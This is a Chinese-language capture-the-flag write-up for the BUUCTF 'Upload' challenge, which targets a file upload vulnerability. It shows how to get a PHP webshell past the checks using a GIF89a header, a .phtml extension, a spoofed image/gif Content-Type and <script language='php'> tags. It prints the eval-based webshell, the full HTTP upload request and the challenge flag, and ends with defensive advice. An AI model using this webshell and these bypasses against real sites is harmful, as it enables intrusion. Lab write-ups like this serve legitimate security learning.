# Writeup 4 [极客大挑战 2019]Upload



## 一、题目信息

- **题目名称**：[极客大挑战 2019]Upload

- **题目类型**：文件上传漏洞

- **靶机地址**：http://7d34e875-5e41-45b9-88c1-ab5b059567b4.node5.buuoj.cn:81/



## 二、漏洞概述

本题是一个典型的文件上传漏洞靶场，后端对上传文件进行了多重检查：

1. 文件头检测（防止伪造图片）
2. 文件后缀名黑名单过滤
3. 文件内容检测（拦截 `<?php` 标签）

通过组合绕过技巧，最终成功上传 Webshell 并获取 Flag。



## 三、解题过程

### 第一步：信息收集

访问靶机地址，页面是一个简单的图片上传表单。

### 第二步：测试上传功能

#### 2.1 测试普通图片上传

创建一个简单的 `test.jpg` 文件，正常上传，观察响应。

#### 2.2 测试 PHP 文件上传

创建 `shell.php`，内容为：

```php
<?php phpinfo(); ?>
```

上传后返回错误提示：

> Not image!

说明后端对文件内容进行了检测，拦截了 `<?php` 标签。

### 第三步：绕过文件头检测

#### 3.1 添加 GIF 文件头

在文件第一行添加 `GIF89a`，用于绕过 `exif_imagetype()` 或 `getimagesize()` 函数检测。

文件内容：

```php
GIF89a
<?php phpinfo(); ?>
```

再次上传，页面仍然显示：

Not image!

可能文件头检测已绕过，但是，有别的过滤。

### 第四步：绕过文件后缀过滤

#### 4.1 测试常见后缀

使用 Burp Suite 抓包，尝试修改文件后缀：

| 后缀     | 结果       |
| -------- | ---------- |
| `.php`   | 被拦截     |
| `.php3`  | 被拦截     |
| `.php4`  | 被拦截     |
| `.php5`  | 被拦截     |
| `.phtml` | ✅ 上传成功 |

发现 `.phtml` 后缀在黑名单之外，可以正常上传。

#### 4.2 修改 Content-Type

同时，在Burp中，将 `Content-Type` 修改为 `image/gif`，模拟真实图片上传：

```http
Content-Type: image/gif
```

### 第五步：绕过文件内容检测

#### 5.1 问题分析

可能靶机后端检测文件内容中是否包含 `<?`，拦截了标准的 PHP 标签。

#### 5.2 使用替代语法

将 PHP 标签替换为 `<script>` 标签：

```php
GIF89a
<script language="php">@eval($_POST['pass']);</script>
```

这种写法不包含 `<?`，可以绕过内容检测。

#### 5.3 最终 Webshell 内容

```php
GIF89a
<script language="php">@eval($_POST['pass']);</script>
```

注意：

记住其中的“pass”，使用蚁剑连接的时候要用到。

### 第六步：上传 Webshell

#### 6.1 完整请求包

```html
POST /upload_file.php HTTP/1.1
Host: 7d34e875-5e41-45b9-88c1-ab5b059567b4.node5.buuoj.cn:81
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:149.0) Gecko/20100101 Firefox/149.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=----geckoformboundary83061a792b9880e0377e4ee13cf7de1
Content-Length: 402
Origin: http://7d34e875-5e41-45b9-88c1-ab5b059567b4.node5.buuoj.cn:81
Connection: keep-alive
Referer: http://7d34e875-5e41-45b9-88c1-ab5b059567b4.node5.buuoj.cn:81/
Upgrade-Insecure-Requests: 1
Priority: u=0, i

------geckoformboundary83061a792b9880e0377e4ee13cf7de1
Content-Disposition: form-data; name="file"; filename="shell.phtml"
Content-Type: image/gif

GIF89a
<script language="php">@eval($_POST['pass']);</script>
------geckoformboundary83061a792b9880e0377e4ee13cf7de1
Content-Disposition: form-data; name="submit"

提交
------geckoformboundary83061a792b9880e0377e4ee13cf7de1--

```

#### 6.2 上传结果

页面显示：

上传文件名：shell.phtml

文件被保存到 `/upload/shell.phtml`。



### 第七步：连接 Webshell 获取 Flag

#### 7.1 触发Payload

访问URL：

http://7d34e875-5e41-45b9-88c1-ab5b059567b4.node5.buuoj.cn:81/upload/shell.phtml

目的：

通过运行shell.phtml，来激活后门，这样，后续步骤才能用蚁剑连接。

页面返回：

GIF89a

说明：已经成功激活后门。

#### 7.2 使用蚁剑连接

- **URL**：`http://7d34e875-5e41-45b9-88c1-ab5b059567b4.node5.buuoj.cn:81/upload/shell.phtml`

- **密码**：`pass`

- **类型**：PHP

  ![01](https://raw.gitcode.com/hengdonghui/pic-blog/raw/main/01.png)

#### 7.2 连接成功

进入文件管理器，在靶机根目录找到 `flag` 文件。

#### 7.3 读取 Flag

打开 `flag` 文件，获得最终 Flag。

flag{d092ab83-2088-4c56-a695-a28066905831}



## 四、绕过技巧总结

| 检测方式          | 绕过方法                                     |
| ----------------- | -------------------------------------------- |
| 文件头检测        | 添加 `GIF89a` 伪造图片头                     |
| 后缀黑名单        | 使用 `.phtml` 后缀                           |
| Content-Type 检测 | 修改为 `image/gif`                           |
| 内容 `<?` 检测    | 使用 `<script language="php">` 替代 PHP 标签 |



## 五、防御建议

1. 使用白名单后缀，而非黑名单

2. 重命名上传文件，避免直接使用原文件名

3. 将文件存储在 Web 目录外，通过脚本读取

4. 使用更严格的内容检测，不仅拦截 `<?`，也要拦截 `<script`

5. 对上传文件进行二次渲染，彻底清除恶意代码

   

## 六、总结

本题综合考察了文件上传漏洞的多种绕过技巧，包括：

- 文件头伪造
- 后缀黑名单绕过
- Content-Type 篡改
- PHP 标签替代

通过组合这些技巧，成功上传 Webshell 并获取 Flag，是一道非常经典的上传漏洞题目。

